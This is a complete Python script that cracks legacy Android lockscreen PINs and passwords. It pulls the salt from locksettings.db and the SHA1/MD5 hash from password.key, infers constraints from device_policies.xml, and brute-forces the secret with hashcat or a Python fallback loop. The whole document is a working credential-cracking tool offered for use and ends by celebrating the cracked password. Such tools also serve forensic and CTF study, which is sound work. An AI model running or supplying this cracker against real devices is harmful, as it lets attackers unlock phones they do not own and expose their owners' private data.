#!/usr/bin/env python3
"""
Android Lockscreen Password Cracker
Automates the process of cracking Android lockscreen passwords from system files
"""

import sqlite3
import xml.etree.ElementTree as ET
import hashlib
import itertools
import string
import subprocess
import sys
import os
import argparse

class AndroidPasswordCracker:
    def __init__(self, password_key_file, locksettings_db, device_policies_xml=None):
        self.password_key_file = password_key_file
        self.locksettings_db = locksettings_db
        self.device_policies_xml = device_policies_xml
        
        self.salt = None
        self.sha1_part = None
        self.md5_part = None
        self.password_constraints = {
            'length': 4,
            'lowercase': False,
            'uppercase': False,
            'numeric': True,
            'symbols': False
        }
        
    def extract_salt_from_db(self):
        """Extract salt from locksettings.db"""
        try:
            conn = sqlite3.connect(self.locksettings_db)
            cursor = conn.cursor()
            
            # Get salt
            cursor.execute("SELECT value FROM locksettings WHERE name='lockscreen.password_salt'")
            result = cursor.fetchone()
            
            if result:
                salt_decimal = int(result[0])
                # Convert to lowercase hex (without 0x)
                self.salt = f"{salt_decimal:016x}"
                print(f"Salt (decimal): {salt_decimal}")
                print(f"Salt (hex): {self.salt}")
            else:
                print("ERROR: Salt not found in database")
                return False
                
            conn.close()
            return True
            
        except Exception as e:
            print(f"ERROR reading database: {e}")
            return False
    
    def extract_hash_from_file(self):
        """Extract password hash from password.key file"""
        try:
            with open(self.password_key_file, 'r') as f:
                full_hash = f.read().strip()
            
            print(f"Full hash: {full_hash}")
            print(f"Hash length: {len(full_hash)} characters")
            
            if len(full_hash) == 72:  # SHA1 (40) + MD5 (32)
                sha1_part = full_hash[:40]
                md5_part = full_hash[40:]
                
                print(f"SHA1 part: {sha1_part}")
                print(f"MD5 part: {md5_part}")
                
                # For cracking, TYPICALLY use the MD5 part
                self.md5_part = md5_part
                
                # Save sha1_part for fallback
                self.sha1_part = sha1_part
                return True
            else:
                print(f"WARNING: Unexpected hash length.")
                return False
                
        except Exception as e:
            print(f"ERROR reading password file: {e}")
            return False
    
    def parse_password_policies(self):
        """Parse device_policies.xml to understand password constraints"""
        if not self.device_policies_xml or not os.path.exists(self.device_policies_xml):
            print("No device policies file provided. Using default constraints.")
            return True
            
        try:
            tree = ET.parse(self.device_policies_xml)
            root = tree.getroot()
            
            # Find active-password element
            active_pwd = root.find('.//active-password')
            if active_pwd is not None:
                length = int(active_pwd.get('length', 4))
                uppercase = int(active_pwd.get('uppercase', 0))
                lowercase = int(active_pwd.get('lowercase', 0))
                numeric = int(active_pwd.get('numeric', 4))
                symbols = int(active_pwd.get('symbols', 0))
                
                self.password_constraints = {
                    'length': length,
                    'lowercase': lowercase > 0,
                    'uppercase': uppercase > 0,
                    'numeric': numeric > 0,
                    'symbols': symbols > 0,
                    'lowercase_count': lowercase,
                    'uppercase_count': uppercase,
                    'numeric_count': numeric,
                    'symbols_count': symbols
                }
                
                print(f"Password constraints from policies:")
                print(f"  Length: {length}")
                print(f"  Lowercase: {lowercase} chars")
                print(f"  Uppercase: {uppercase} chars")
                print(f"  Numeric: {numeric} chars")
                print(f"  Symbols: {symbols} chars")
                
                return True
            else:
                print("No active-password found in policies. Using default (4-digit PIN).")
                return True
                
        except Exception as e:
            print(f"ERROR parsing device policies: {e}")
            return False
    
    def generate_charset(self):
        """Generate character set based on password constraints"""
        charset = ""
        
        if self.password_constraints.get('lowercase', False):
            charset += string.ascii_lowercase
        if self.password_constraints.get('uppercase', False):
            charset += string.ascii_uppercase
        if self.password_constraints.get('numeric', False):
            charset += string.digits
        if self.password_constraints.get('symbols', False):
            charset += "!@#$%^&*.:,;-_/()[]\\{\\}"
            
        if not charset:  # Default to digit if nothing specified
            charset = string.digits
            
        return charset
    
    def crack_with_hashcat(self):
        """Attempt to crack using hashcat"""
        # Create hash (MD5) file for hashcat
        hash_file = "android_hash.txt"    
        with open(hash_file, 'w') as f:
            f.write(f"{self.md5_part}:{self.salt}")
        print(f"Created hash file: {hash_file}")
        print(f"Hash format: {self.md5_part}:{self.salt}")
        
        # Build hashcat command
        length = self.password_constraints.get('length', 4)
        charset = self.generate_charset()
        
        # Create mask based on charset
        if charset == string.ascii_lowercase:
            mask = '?l' * length
        elif charset == string.digits:
            mask = '?d' * length
        elif charset == string.ascii_letters:
            mask = '?a' * length  # All printable ASCII
        else:
            mask = '?a' * length  # Fallback to all
        
        modes_to_try = [10, 110]  # md5($pass.$salt), sha1($pass.$salt)
        
        for mode in modes_to_try:
            if mode == 110:
                print(f"\n🔎 Trying using SHA1 part...")    
                with open(hash_file, 'w') as f:
                    f.write(f"{self.sha1_part}:{self.salt}")
                print(f"Hash format: {self.sha1_part}:{self.salt}")
            
            print(f"\nTrying hashcat mode {mode}...")
            cmd = ['hashcat', '-m', str(mode), hash_file, '-a', '3', mask]
            print(f"🫡 Hashcat command {cmd}")
            
            try:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
                if result.returncode == 0:
                    show_cmd = ['hashcat', '-m', str(mode), hash_file, '--show']
                    show_result = subprocess.run(show_cmd, capture_output=True, text=True)
                    if show_result.returncode == 0 and show_result.stdout.strip():
                        password = show_result.stdout.strip().split(':')[-1]
                        return password
                        
            except subprocess.TimeoutExpired:
                print(f"Timeout for mode {mode}")
                continue
            except FileNotFoundError:
                print("hashcat not found (install the tool or check previous installation). Falling back to Python implementation.")
                break
                
        return None
    
    def crack_with_python(self):
        """Fallback Python implementation"""
        print("Using Python brute force implementation...")
        
        target_hash = self.md5_part.lower()
        salt = self.salt
        length = self.password_constraints.get('length', 4)
        charset = self.generate_charset()
        
        print(f"Target hash: {target_hash}")
        print(f"Salt: {salt}")
        print(f"Charset: {charset}")
        print(f"Length: {length}")
        
        total_combinations = len(charset) ** length
        print(f"Total combinations to test: {total_combinations:,}")
        
        count = 0
        for password_tuple in itertools.product(charset, repeat=length):
            password = ''.join(password_tuple)
            count += 1
            
            # Test MD5(password + salt)
            test_string = password + salt
            md5_hash = hashlib.md5(test_string.encode()).hexdigest().lower()
            
            if md5_hash == target_hash:
                print(f"✓ PASSWORD FOUND: {password}")
                return password
                
            # Progress indicator
            if count % 100000 == 0:
                progress = (count / total_combinations) * 100
                print(f"Progress: {count:,}/{total_combinations:,} ({progress:.1f}%) - Current: {password}")
        
        print("✗ Password not found with Python implementation")
        return None
    
    def crack_password(self):
        """Main method to crack the password"""
        print("=== 🤖 Android Lockscreen Password Cracker 🤖 ===\n")
        
        # Step 1: Extract salt from database
        print("🧂 Step 1: Extracting salt from locksettings.db file 🧂")
        if not self.extract_salt_from_db():
            return None
            
        # Step 2: Extract hash from file
        print("\n🔐 Step 2: Extracting password hash from password.key file 🔐")
        if not self.extract_hash_from_file():
            return None
            
        # Step 3: Parse password policies
        print("\n📁 Step 3: Parsing password policies frome device_policies.xml file 📁")
        self.parse_password_policies()
        
        # Step 4: Attempt cracking
        print("\n🏁 Step 4: STARTING password cracking 🏁")
        
        password = self.crack_with_hashcat()
        if not password:
            password = self.crack_with_python()
            
        return password

def main():
    parser = argparse.ArgumentParser(description='Android Lockscreen Password Cracker')
    parser.add_argument('password_key', help='Path to password.key file')
    parser.add_argument('locksettings_db', help='Path to locksettings.db file')
    parser.add_argument('--policies', help='Path to device_policies.xml file. Default is 4-digit PIN.')
    
    args = parser.parse_args()
    
    # Verify files exist
    if not os.path.exists(args.password_key):
        print(f"ERROR: {args.password_key} not found")
        sys.exit(1)
        
    if not os.path.exists(args.locksettings_db):
        print(f"ERROR: {args.locksettings_db} not found")
        sys.exit(1)
    
    # Create cracker instance
    cracker = AndroidPasswordCracker(
        args.password_key,
        args.locksettings_db,
        args.policies
    )
    
    # Crack the password
    password = cracker.crack_password()
    
    if password:
        print(f"\n🎉 SUCCESS! Password cracked: '{password}' 🎇 ENJOY! 🎆")
    else:
        print(f"\n❌ Failed to crack password. Try manual analysis.")

if __name__ == "__main__":
    main()
